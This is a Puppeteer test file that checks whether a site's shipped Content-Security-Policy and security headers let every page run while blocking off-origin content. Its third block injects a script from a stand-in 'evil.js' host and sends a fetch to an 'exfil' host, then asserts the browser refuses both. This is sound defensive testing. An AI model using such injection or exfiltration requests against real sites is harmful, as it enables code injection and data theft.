/* test_csp.mjs — the security headers we SHIP, exercised by the browser that has to obey them.
 *
 * THE HOLE THIS FILE CLOSES. `sim/web/_headers` is only ever sent by Cloudflare Pages.
 * Every browser suite in this repo serves the site from a plain static server that sends
 * NO headers at all — so until now nothing could tell the difference between a policy that
 * is safe and a policy that blanks the page. That is not a theoretical worry: a CSP that
 * refuses an inline `<script>` does not degrade, it stops the page dead, and the failure
 * would first be seen by a visitor on the live domain.
 *
 * So this suite parses the REAL `_headers` (never a restated copy of the policy — a
 * hard-coded string could pass while the shipped header said something else), serves every
 * page with it, and asserts each one still WORKS: the modules ran, the inline blocks ran,
 * and nothing was refused.
 *
 * IT HAS TEETH. Block 3 injects a script tag from another origin into the loaded page and
 * requires the policy to REFUSE it. Without that, a green run would be equally consistent
 * with "the policy is correct" and "no policy arrived at all".
 *
 * WHAT IS DELIBERATELY NOT ASSERTED: `script-src` without `'unsafe-inline'`. The bundle has
 * nine inline `<script>` blocks across five pages plus ten inline `onclick=` attributes,
 * and `_headers` is a static file, so a per-response nonce is impossible and the only route
 * is a SHA-256 hash per block plus a build step and a freshness guard. `sim/web/_headers`
 * records that as the specific blocker. What IS asserted is the half that ships today: no
 * script from any other origin can load, and nothing can be sent to any other origin.
 *
 *   node sim/test_csp.mjs
 */
import { requireBrowser, serveWeb, pagesHeaders, makeChecks, finish } from "./browser_harness.mjs";

const LABEL = "CSP + security-headers test";
const { puppeteer, chrome } = await requireBrowser(LABEL);
const { fails, ok, eq, count } = makeChecks();

const site = await serveWeb({ headers: true });
const H = pagesHeaders();

/* Served under a NON-local hostname, mapped to the loopback server. That is not cosmetic:
 * `_headers` is a Cloudflare Pages artifact and Pages serves a public hostname, so this is
 * the configuration the policy actually ships into. On a LOCAL host `env.js` additionally
 * probes the optional :8081/:8082 sidecars — which this same policy refuses, correctly and
 * only under `wrangler pages dev` (headers + localhost at once). Loading from 127.0.0.1
 * would fold that dev-only quirk into every assertion below and hide real refusals behind
 * an allowance. */
const HOST = `http://moxie.hosted.test:${site.port}`;

const browser = await puppeteer.launch({
  executablePath: chrome, headless: "new",
  args: ["--no-sandbox", "--use-gl=swiftshader", "--enable-unsafe-swiftshader",
         `--host-resolver-rules=MAP moxie.hosted.test 127.0.0.1:${site.port}`],
});

/* ONE known, pre-existing refusal, named exactly rather than matched loosely.
 *
 * The repo's own `README.md` is bundled into the docs explorer and embeds an image hosted
 * on github.com (`user-attachments/…`). `img-src 'self' data: blob:` predates this pass and
 * refuses it — correctly: this project's standing rule is that everything is vendored and
 * links are assumed to die, so an off-site image in a doc is the defect, not the policy.
 * It is listed here so the guard stays STRICT for everything else and so the exemption
 * cannot be inherited silently — fixing the README removes this constant. */
const KNOWN_REFUSALS = [/user-attachments.*violates.*img-src/i];

const POLICY_LINE = /Content Security Policy|Refused to (load|connect|execute|run|apply|frame)/i;
const isKnown = (e) => KNOWN_REFUSALS.some((k) => k.test(e));

/** Console lines that are a POLICY refusal we have NOT already accounted for. */
const cspErrors = (errs) => errs.filter((e) => POLICY_LINE.test(e) && !isKnown(e));

/* Each page, and the runtime fact that proves its scripts really ran under the policy.
 * A page that loads but whose inline block was refused looks fine to the naked eye and to
 * every structural check — the probe is what separates the two. */
const PAGES = [
  ["index.html", () => !!document.getElementById("bg-canvas")],
  ["setup.html", () => !!document.getElementById("bg-canvas") && !!window.moxieQR],
  ["cloud.html", () => !!document.getElementById("bg-canvas")],
  ["docs.html", () => !!document.getElementById("tree") &&
                      document.querySelectorAll("#tree a, #tree button, #tree li").length > 0],
  // `window.moxie` is the load-bearing one: it only exists if the ES MODULE resolved
  // through sim.html's inline `<script type="importmap">` and three.js loaded from
  // ./vendor. That is the single most CSP-fragile thing on the site.
  ["sim.html", () => !!window.moxie && !!window.moxieBridge && !!window.moxieAudio &&
                     !!window.moxieMode && !!window.moxieTypedTurn && !!window.moxieStub],
];

async function load(path) {
  const page = await browser.newPage();
  await page.setViewport({ width: 1440, height: 900 });
  const errs = [];
  page.on("console", (m) => { if (m.type() === "error") errs.push(m.text()); });
  page.on("pageerror", (e) => errs.push("PAGEERR " + e.message));
  const res = await page.goto(`${HOST}/${path}`, { waitUntil: "domcontentloaded", timeout: 20000 });
  await new Promise((r) => setTimeout(r, 2500));
  return { page, errs, headers: res.headers() };
}

try {
  /* =====================================================================
   * 1. The policy itself — read off the file we ship, not off a memory of it.
   * =================================================================== */
  {
    const csp = H["Content-Security-Policy"] || "";
    ok(/(^|;\s*)script-src\s+'self'/.test(csp),
       `_headers must pin script-src to 'self' (got ${JSON.stringify(csp)})`);
    ok(/(^|;\s*)connect-src\s+'self'\s*(;|$)/.test(csp),
       "connect-src stays exactly 'self' — it is what refused the port-8081 fetch");
    for (const d of ["object-src 'none'", "base-uri 'none'", "frame-ancestors 'none'", "form-action 'none'"])
      ok(csp.includes(d), `_headers must carry ${d}`);
    const hsts = H["Strict-Transport-Security"] || "";
    ok(/max-age=\d{7,}/.test(hsts), `HSTS must be set with a real max-age (got ${JSON.stringify(hsts)})`);
    eq(H["X-Content-Type-Options"], "nosniff", "nosniff is still there");
  }

  /* =====================================================================
   * 2. Every page still works with that policy actually applied.
   * =================================================================== */
  for (const [path, probe] of PAGES) {
    const { page, errs, headers } = await load(path);
    ok((headers["content-security-policy"] || "").includes("script-src"),
       `${path}: the browser really received the policy`);
    ok((headers["strict-transport-security"] || "").includes("max-age"),
       `${path}: …and HSTS`);
    eq(cspErrors(errs).length, 0,
       `${path}: NOTHING was refused by the policy — ${cspErrors(errs).slice(0, 3).join(" | ")}`);
    ok(await page.evaluate(probe),
       `${path}: its scripts actually ran under the policy (the inline blocks were not refused)`);
    // Anything else on the console is a page fault, not a policy one, and is worth knowing.
    const other = errs.filter((e) => !POLICY_LINE.test(e) && !isKnown(e) &&
                                     !/Failed to load resource: the server responded with a status of 404/.test(e));
    eq(other.length, 0, `${path}: no other console errors — ${other.slice(0, 3).join(" | ")}`);
    await page.close();
  }

  /* =====================================================================
   * 3. TEETH — the policy is in force, and it refuses what it should.
   * =================================================================== */
  {
    const { page, errs } = await load("sim.html");
    const before = cspErrors(errs).length;
    eq(before, 0, "teeth: the page is clean before anything is injected");

    const loaded = await page.evaluate(() => new Promise((resolve) => {
      const s = document.createElement("script");
      s.src = "https://cdn.invalid.test/evil.js";
      s.onload = () => resolve("loaded");
      s.onerror = () => resolve("refused");
      document.head.appendChild(s);
      setTimeout(() => resolve("timeout"), 3000);
    }));
    eq(loaded, "refused",
       "teeth: a script from another origin is REFUSED — without script-src it would have run");
    await new Promise((r) => setTimeout(r, 400));
    ok(cspErrors(errs).length > before,
       "teeth: …and the browser logged the refusal, so the policy really is the one in force");

    const fetched = await page.evaluate(() =>
      fetch("https://exfil.invalid.test/x", { mode: "cors" }).then(() => "sent").catch(() => "blocked"));
    eq(fetched, "blocked", "teeth: connect-src still refuses an off-origin request");
    await page.close();
  }
} catch (e) {
  fails.push("threw: " + (e && e.stack ? e.stack.split("\n").slice(0, 4).join(" / ") : e));
} finally {
  await browser.close().catch(() => {});
  site.close();
}

finish(LABEL, { fails, count });
